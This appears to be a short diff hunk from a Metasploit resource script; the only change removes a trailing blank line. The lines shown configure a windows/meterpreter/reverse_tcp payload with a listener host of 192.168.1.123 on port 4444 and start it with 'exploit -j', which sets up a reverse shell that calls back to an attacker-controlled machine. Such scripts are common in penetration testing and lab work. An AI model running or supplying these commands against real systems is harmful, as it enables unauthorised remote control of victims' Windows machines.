@@ -10,4 +10,3 @@ windows/meterpreter/reverse_tcp
 set lhost 192.168.1.123
 set lport 4444
 exploit -j
-
